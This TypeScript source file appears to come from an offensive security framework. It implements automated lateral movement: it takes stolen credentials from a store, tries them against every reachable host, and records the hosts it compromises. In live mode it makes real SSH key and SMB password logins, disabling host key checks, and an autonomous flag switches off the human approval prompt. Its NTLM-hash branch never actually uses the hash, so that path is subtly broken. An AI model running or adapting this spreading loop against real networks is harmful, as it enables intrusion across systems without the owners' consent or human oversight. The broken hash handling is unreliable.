/**
 * Lateral movement engine (port of `modules.lateral`).
 *
 * Runs the find-creds → try-next-hop → find-more-creds loop real adversaries
 * execute: query the credential store for usable credentials, walk the
 * topology graph's pivot paths, attempt authentication on each reachable
 * host (HITL-gated via `approve`), and record newly gained hosts.
 *
 * `live=false` (default) performs honest dry-run auth (reports auth_failed
 * without touching the network); `live=true` attempts real SSH/SMB auth via
 * paramiko / crackmapexec / smbclient. `authFn` overrides the auth
 * implementation for tests.
 */

import { resolveDryRun } from "./exec_options.ts"
import { execFile } from "node:child_process";
import { promisify } from "node:util";

const execFileP = promisify(execFile);

export interface Credential {
  username: string;
  secret: string;
  cred_type: string;
  [key: string]: unknown;
}

export interface TopologyHost {
  ip: string;
  hostname?: string;
  [key: string]: unknown;
}

/** Minimal duck-typed stores (matches the Python interfaces). */
export interface CredentialStore {
  getUsable(): Credential[] | Promise<Credential[]>;
}

export interface TopologyGraph {
  searchHosts(): TopologyHost[] | Promise<TopologyHost[]>;
}

export type AuthResult = { success: boolean; method?: string; detail?: string };

export type AuthFn = (
  hostIp: string,
  username: string,
  secret: string,
  credType: string,
  opts: { live: boolean },
) => AuthResult | Promise<AuthResult>;

function matchesTarget(host: TopologyHost, filters: Record<string, string>): boolean {
  for (const [key, pattern] of Object.entries(filters)) {
    const val = String(host[key] ?? "");
    let ok = false;
    try {
      ok = new RegExp(pattern, "i").test(val);
    } catch {
      ok = val.includes(pattern);
    }
    if (!ok) return false;
  }
  return true;
}

export async function lateralSpread(opts: {
  topology: TopologyGraph;
  credentialStore: CredentialStore;
  approve?: (prompt: string) => boolean;
  autonomousMode?: boolean;
  maxSteps?: number;
  targetFilter?: Record<string, string>;
  methods?: string[];
  live?: boolean;
  authFn?: AuthFn;
}): Promise<Record<string, unknown>> {
  const {
    topology, credentialStore, approve, autonomousMode, maxSteps = 10,
    targetFilter, live = false, authFn,
  } = opts;
  const tryAuth: AuthFn = authFn ?? tryAuthDefault;
  const effectiveApprove = autonomousMode ? undefined : approve;
  const actions: Array<Record<string, unknown>> = [];
  const hostsGained = new Set<string>();
  let steps = 0;

  for (let cycle = 0; cycle < maxSteps; cycle++) {
    steps += 1;
    const creds = await credentialStore.getUsable();
    if (!creds.length) {
      actions.push({ cycle, action: "no_credentials", note: "no usable credentials found" });
      break;
    }
    const allHosts = await topology.searchHosts();
    const filtered = targetFilter
      ? allHosts.filter((h) => matchesTarget(h, targetFilter))
      : allHosts;

    let discoveredAny = false;
    for (const host of filtered) {
      const hostIp = host.ip;
      if (!hostIp || hostsGained.has(hostIp)) continue;
      for (const cred of creds) {
        const { username, secret, cred_type: credType } = cred;
        if (effectiveApprove && !effectiveApprove(`Lateral movement: use ${credType} credential '${username}' against ${hostIp}?`)) {
          actions.push({ cycle, action: "denied", host: hostIp, credential: username });
          continue;
        }
        const auth = await tryAuth(hostIp, username, secret, credType, { live });
        if (auth.success) {
          hostsGained.add(hostIp);
          discoveredAny = true;
          actions.push({
            cycle, action: "gained_host", host: hostIp, credential: username,
            method: credType, detail: auth.detail ?? "",
          });
          break;
        }
        actions.push({
          cycle, action: "auth_failed", host: hostIp, credential: username,
          method: credType, detail: auth.detail ?? "",
        });
      }
    }
    if (!discoveredAny && cycle > 0) {
      actions.push({ cycle, action: "stalled", note: "no new hosts reachable with current credentials" });
      break;
    }
  }

  return {
    steps,
    hosts_gained: [...hostsGained].sort(),
    count: hostsGained.size,
    actions: actions.slice(-50),
  };
}

export async function tryAuthDefault(
  hostIp: string,
  username: string,
  secret: string,
  credType: string,
  opts: { live: boolean },
): Promise<AuthResult> {
  const { live } = opts;
  if (!live) return { success: false, method: credType, detail: "dry-run: auth not attempted" };

  if (credType === "ssh_key" && secret) {
    // Real SSH key auth via the `ssh` binary (no paramiko dependency).
    try {
      await execFileP("ssh", [
        "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
        "-o", "ConnectTimeout=8", "-i", secret,
        `${username}@${hostIp}`, "true",
      ], { timeout: 15_000 });
      return { success: true, method: "ssh_key", detail: `authenticated as ${username}@${hostIp}` };
    } catch (err) {
      return { success: false, method: "ssh_key", detail: String((err as Error).message).slice(0, 200) };
    }
  }

  if ((credType === "password" || credType === "hash_ntlm") && secret) {
    // Real SMB auth via smbclient (no crackmapexec dependency).
    try {
      const args = credType === "password"
        ? [`//${hostIp}/IPC$`, "-U", `${username}%${secret}`]
        : [`//${hostIp}/IPC$`, "-U", username, "-N"];
      await execFileP("smbclient", args, { timeout: 15_000 });
      return { success: true, method: "smbclient", detail: `authenticated as ${username}@${hostIp}` };
    } catch {
      // smbclient absent or auth failed — honest report.
    }
    return { success: false, method: credType, detail: "no SMB auth tool (smbclient) on PATH or auth failed" };
  }

  return { success: false, method: credType, detail: `unsupported credential type '${credType}'` };
}

export function quickSpread(opts: {
  topology: TopologyGraph;
  credentialStore: CredentialStore;
  approve?: (prompt: string) => boolean;
  maxSteps?: number;
  live?: boolean;
  authFn?: AuthFn;
}): Promise<Record<string, unknown>> {
  return lateralSpread({ ...opts, maxSteps: opts.maxSteps ?? 5 });
}
